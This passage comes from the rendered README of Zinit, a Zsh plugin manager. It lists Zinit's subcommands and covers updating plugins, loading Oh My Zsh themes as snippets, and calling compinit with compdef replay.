&lt;td align="center"&gt;&lt;code&gt;cuninstall {plg-spec}&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Uninstall completions for plugin.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;csearch&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Search for available completions from any plugin.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;compinit&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Refresh installed completions.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;cclear&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Clear stray and improper completions.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;cdlist&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Show compdef replay list.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;cdreplay [-q]&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Replay compdefs (to be done after compinit). &lt;code&gt;-q&lt;/code&gt; – quiet.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;cdclear [-q]&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Clear compdef replay list. &lt;code&gt;-q&lt;/code&gt; – quiet.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3&gt;&lt;a id="user-content-tracking-of-the-active-session" class="anchor" aria-hidden="true" href="#tracking-of-the-active-session"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Tracking of the Active Session&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align="center"&gt;Command&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;dtrace, dstart&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Start tracking what's going on in session.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;dstop&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Stop tracking what's going on in session.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;dunload&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Revert changes recorded between dstart and dstop.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;dreport&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Report what was going on in session.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;dclear&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Clear report of what was going on in session.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3&gt;&lt;a id="user-content-reports-and-statistics" class="anchor" aria-hidden="true" href="#reports-and-statistics"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Reports and Statistics&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align="center"&gt;Command&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;times [-s] [-m]&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Statistics on plugin load times, sorted in order of loading. &lt;code&gt;-s&lt;/code&gt; – use seconds instead of milliseconds. &lt;code&gt;-m&lt;/code&gt; – show plugin loading moments.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;zstatus&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Overall Zinit status.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;report {plg-spec}|--all&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Show plugin report. &lt;code&gt;--all&lt;/code&gt; – do it for all plugins.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;loaded [keyword], list [keyword]&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Show what plugins are loaded (filter with 'keyword').&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;ls&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; List snippets in formatted and colorized manner. Requires &lt;strong&gt;tree&lt;/strong&gt; program.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;status {plg-spec}|URL|--all&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Git status for plugin or svn status for snippet. &lt;code&gt;--all&lt;/code&gt; – do it for all plugins and snippets.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;recently [time-spec]&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Show plugins that changed recently, argument is e.g. 1 month 2 days.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;bindkeys&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Lists bindkeys set up by each plugin.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3&gt;&lt;a id="user-content-compiling" class="anchor" aria-hidden="true" href="#compiling"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Compiling&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align="center"&gt;Command&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;compile {plg-spec}|--all&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Compile plugin. &lt;code&gt;--all&lt;/code&gt; – compile all plugins.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;uncompile {plg-spec}|--all&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Remove compiled version of plugin. &lt;code&gt;--all&lt;/code&gt; – do it for all plugins.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;compiled&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; List plugins that are compiled.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3&gt;&lt;a id="user-content-other" class="anchor" aria-hidden="true" href="#other"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Other&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align="center"&gt;Command&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;self-update&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Updates and compiles Zinit.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;update [-q] [-r] {plg-spec}|URL|--all&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Git update plugin or snippet.&lt;br&gt; &lt;code&gt;--all&lt;/code&gt; – update all plugins and snippets.&lt;br&gt;  &lt;code&gt;-q&lt;/code&gt; – quiet.&lt;br&gt; &lt;code&gt;-r&lt;/code&gt; | &lt;code&gt;--reset&lt;/code&gt; – run &lt;code&gt;git reset --hard&lt;/code&gt; / &lt;code&gt;svn revert&lt;/code&gt; before pulling changes.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;ice &amp;lt;ice specification&amp;gt;&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Add ice to next command, argument is e.g. from"gitlab".&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;delete {plg-spec}|URL|--clean|--all&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Remove plugin or snippet from disk (good to forget wrongly passed ice-mods).  &lt;br&gt; &lt;code&gt;--all&lt;/code&gt; – purge.&lt;br&gt; &lt;code&gt;--clean&lt;/code&gt; – delete plugins and snippets that are not loaded.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;cd {plg-spec}&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Cd into plugin's directory. Also support snippets if fed with URL.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;edit {plg-spec}&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Edit plugin's file with $EDITOR.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;glance {plg-spec}&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Look at plugin's source (pygmentize, {,source-}highlight).&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;stress {plg-spec}&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Test plugin for compatibility with set of options.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;changes {plg-spec}&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; View plugin's git log.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;create {plg-spec}&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Create plugin (also together with GitHub repository).&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;srv {service-id} [cmd]&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Control a service, command can be: stop,start,restart,next,quit; &lt;code&gt;next&lt;/code&gt; moves the service to another Zshell.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;recall {plg-spec}|URL&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Fetch saved ice modifiers and construct &lt;code&gt;zinit ice ...&lt;/code&gt; command.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;env-whitelist [-v] [-h] {env..}&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Allows to specify names (also patterns) of variables left unchanged during an unload. &lt;code&gt;-v&lt;/code&gt; – verbose.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;module&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Manage binary Zsh module shipped with Zinit, see &lt;code&gt;zinit module help&lt;/code&gt;.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;add-fpath|fpath&lt;/code&gt; &lt;code&gt;[-f|--front]&lt;/code&gt; &lt;code&gt;{plg-spec}&lt;/code&gt; &lt;code&gt;[subdirectory]&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt;Adds given plugin (not yet snippet) directory to &lt;code&gt;$fpath&lt;/code&gt;. If the second argument is given, it is appended to the directory path. If the option &lt;code&gt;-f&lt;/code&gt;/&lt;code&gt;--front&lt;/code&gt; is given, the directory path is prepended instead of appended to &lt;code&gt;$fpath&lt;/code&gt;. The &lt;code&gt;{plg-spec}&lt;/code&gt; can be absolute path, i.e.: it's possible to also add regular directories.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;run&lt;/code&gt; &lt;code&gt;[-l]&lt;/code&gt; &lt;code&gt;[plugin]&lt;/code&gt; &lt;code&gt;{command}&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt;Runs the given command in the given plugin's directory. If the option &lt;code&gt;-l&lt;/code&gt; will be given then the plugin should be skipped – the option will cause the previous plugin to be reused.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2&gt;&lt;a id="user-content-updating-zinit-and-plugins" class="anchor" aria-hidden="true" href="#updating-zinit-and-plugins"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Updating Zinit and Plugins&lt;/h2&gt;
&lt;p&gt;To update Zinit issue &lt;code&gt;zinit self-update&lt;/code&gt; in the command line.&lt;/p&gt;
&lt;p&gt;To update all plugins and snippets, issue &lt;code&gt;zinit update&lt;/code&gt;. If you wish to update only
a single plugin/snippet instead issue &lt;code&gt;zinit update NAME_OF_PLUGIN&lt;/code&gt;. A list of
commits will be shown:&lt;/p&gt;
&lt;p align="center"&gt;
&lt;a target="_blank" rel="noopener noreferrer" href="./doc/img/update.png"&gt;&lt;img src="./doc/img/update.png" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;Some plugins require performing an action each time they're updated. One way you can do
this is by using the &lt;code&gt;atpull&lt;/code&gt; ice modifier. For example, writing &lt;code&gt;zinit ice atpull'./configure'&lt;/code&gt; before loading a plugin will execute &lt;code&gt;./configure&lt;/code&gt; after a successful update. Refer to &lt;a href="#ice-modifiers"&gt;Ice Modifiers&lt;/a&gt; for more information.&lt;/p&gt;
&lt;p&gt;The ice modifiers for any plugin or snippet are stored in their directory in a
&lt;code&gt;._zinit&lt;/code&gt; subdirectory, hence the plugin doesn't have to be loaded to be correctly
updated. There's one other file created there, &lt;code&gt;.zinit_lstupd&lt;/code&gt; – it holds the log of
the new commits pulled-in in the last update.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-using-oh-my-zsh-themes" class="anchor" aria-hidden="true" href="#using-oh-my-zsh-themes"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Using Oh My Zsh Themes&lt;/h2&gt;
&lt;p&gt;To use &lt;strong&gt;themes&lt;/strong&gt; created for Oh My Zsh you might want to first source the &lt;code&gt;git&lt;/code&gt; library there:&lt;/p&gt;
&lt;div class="highlight highlight-source-systemverilog"&gt;&lt;pre&gt;zinit snippet http&lt;span class="pl-k"&gt;:&lt;/span&gt;&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;//&lt;/span&gt;github.com/ohmyzsh/ohmyzsh/raw/master/lib/git.zsh&lt;/span&gt;
&lt;span class="pl-k"&gt;#&lt;/span&gt; Or using &lt;span class="pl-c1"&gt;OMZ&lt;/span&gt;&lt;span class="pl-k"&gt;::&lt;/span&gt; shorthand&lt;span class="pl-k"&gt;:&lt;/span&gt;
zinit snippet &lt;span class="pl-c1"&gt;OMZ&lt;/span&gt;&lt;span class="pl-k"&gt;::&lt;/span&gt;lib&lt;span class="pl-k"&gt;/&lt;/span&gt;git.zsh&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If the library will not be loaded, then similar to following errors will be appearing:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;........:1: command not found: git_prompt_status
........:1: command not found: git_prompt_short_sha
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Then you can use the themes as snippets (&lt;code&gt;zinit snippet {file path or GitHub URL}&lt;/code&gt;).
Some themes require not only Oh My Zsh's Git &lt;strong&gt;library&lt;/strong&gt;, but also Git &lt;strong&gt;plugin&lt;/strong&gt; (error
about &lt;code&gt;current_branch&lt;/code&gt; function can be appearing). Load this Git-plugin as single-file
snippet directly from OMZ:&lt;/p&gt;
&lt;div class="highlight highlight-source-systemverilog"&gt;&lt;pre&gt;zinit snippet &lt;span class="pl-c1"&gt;OMZ&lt;/span&gt;&lt;span class="pl-k"&gt;::&lt;/span&gt;plugins&lt;span class="pl-k"&gt;/&lt;/span&gt;git&lt;span class="pl-k"&gt;/&lt;/span&gt;git.plugin.zsh&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Such lines should be added to &lt;code&gt;.zshrc&lt;/code&gt;. Snippets are cached locally, use &lt;code&gt;-f&lt;/code&gt; option to download
a fresh version of a snippet, or &lt;code&gt;zinit update {URL}&lt;/code&gt;. Can also use &lt;code&gt;zinit update --all&lt;/code&gt; to
update all snippets (and plugins).&lt;/p&gt;
&lt;p&gt;Most themes require &lt;code&gt;promptsubst&lt;/code&gt; option (&lt;code&gt;setopt promptsubst&lt;/code&gt; in &lt;code&gt;zshrc&lt;/code&gt;), if it isn't set, then
prompt will appear as something like: &lt;code&gt;... $(build_prompt) ...&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;You might want to suppress completions provided by the git plugin by issuing &lt;code&gt;zinit cdclear -q&lt;/code&gt;
(&lt;code&gt;-q&lt;/code&gt; is for quiet) – see below &lt;strong&gt;Ignoring Compdefs&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;To summarize:&lt;/p&gt;
&lt;div class="highlight highlight-source-systemverilog"&gt;&lt;pre&gt;&lt;span class="pl-k"&gt;#&lt;/span&gt; Load &lt;span class="pl-c1"&gt;OMZ&lt;/span&gt; &lt;span class="pl-k"&gt;Git&lt;/span&gt; &lt;span class="pl-en"&gt;library&lt;/span&gt;
zinit snippet &lt;span class="pl-c1"&gt;OMZ&lt;/span&gt;&lt;span class="pl-k"&gt;::&lt;/span&gt;lib&lt;span class="pl-k"&gt;/&lt;/span&gt;git.zsh

&lt;span class="pl-k"&gt;#&lt;/span&gt; Load Git plugin from &lt;span class="pl-c1"&gt;OMZ&lt;/span&gt;
zinit snippet &lt;span class="pl-c1"&gt;OMZ&lt;/span&gt;&lt;span class="pl-k"&gt;::&lt;/span&gt;plugins&lt;span class="pl-k"&gt;/&lt;/span&gt;git&lt;span class="pl-k"&gt;/&lt;/span&gt;git.plugin.zsh
zinit cdclear &lt;span class="pl-k"&gt;-&lt;/span&gt;q &lt;span class="pl-k"&gt;#&lt;/span&gt; &lt;span class="pl-k"&gt;&amp;lt;&lt;/span&gt;&lt;span class="pl-k"&gt;-&lt;/span&gt; forget completions provided up to this moment

setopt promptsubst

&lt;span class="pl-k"&gt;#&lt;/span&gt; Load theme from &lt;span class="pl-c1"&gt;OMZ&lt;/span&gt;
zinit snippet &lt;span class="pl-c1"&gt;OMZ&lt;/span&gt;&lt;span class="pl-k"&gt;::&lt;/span&gt;themes&lt;span class="pl-k"&gt;/&lt;/span&gt;dstufft.zsh&lt;span class="pl-k"&gt;-&lt;/span&gt;theme

&lt;span class="pl-k"&gt;#&lt;/span&gt; Load normal GitHub plugin with theme depending on &lt;span class="pl-c1"&gt;OMZ&lt;/span&gt; Git library
zinit light NicoSantangelo&lt;span class="pl-k"&gt;/&lt;/span&gt;Alpharized&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;See also the Wiki page: &lt;a href="http://zdharma.org/zinit/wiki/Example-Oh-My-Zsh-setup/" rel="nofollow"&gt;Example Oh My Zsh
Setup&lt;/a&gt;.&lt;/p&gt;
&lt;h1&gt;&lt;a id="user-content-completions-2" class="anchor" aria-hidden="true" href="#completions-2"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Completions&lt;/h1&gt;
&lt;h2&gt;&lt;a id="user-content-calling-compinit-without-turbo-mode" class="anchor" aria-hidden="true" href="#calling-compinit-without-turbo-mode"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Calling &lt;code&gt;compinit&lt;/code&gt; Without Turbo Mode&lt;/h2&gt;
&lt;p&gt;With no Turbo mode in use, compinit can be called normally, i.e.: as &lt;code&gt;autoload compinit; compinit&lt;/code&gt;. This should be done after loading of all plugins and before possibly calling
&lt;code&gt;zinit cdreplay&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;cdreplay&lt;/code&gt; subcommand is provided to re-play all catched &lt;code&gt;compdef&lt;/code&gt; calls. The
&lt;code&gt;compdef&lt;/code&gt; calls are used to define a completion for a command. For example, &lt;code&gt;compdef _git git&lt;/code&gt; defines that the &lt;code&gt;git&lt;/code&gt; command should be completed by a &lt;code&gt;_git&lt;/code&gt; function.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;compdef&lt;/code&gt; function is provided by &lt;code&gt;compinit&lt;/code&gt; call. As it should be called later,
after loading all of the plugins, Zinit provides its own &lt;code&gt;compdef&lt;/code&gt; function that
catches (i.e.: records in an array) the arguments of the call, so that the loaded
plugins can freely call &lt;code&gt;compdef&lt;/code&gt;. Then, the &lt;code&gt;cdreplay&lt;/code&gt; (&lt;em&gt;compdef-replay&lt;/em&gt;) can be used,
after &lt;code&gt;compinit&lt;/code&gt; will be called (and the original &lt;code&gt;compdef&lt;/code&gt; function will become
available), to execute all detected &lt;code&gt;compdef&lt;/code&gt; calls. To summarize:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;&lt;span class="pl-c1"&gt;source&lt;/span&gt; &lt;span class="pl-k"&gt;~&lt;/span&gt;/.zinit/bin/zinit.zsh

zinit load &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;some/plugin&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;
...
compdef _gnu_generic fd  &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; this will be intercepted by Zinit, because as the compinit&lt;/span&gt;
                         &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; isn't yet loaded, thus there's no such function `compdef'; yet&lt;/span&gt;
                         &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Zinit provides its own `compdef' function which saves the&lt;/span&gt;
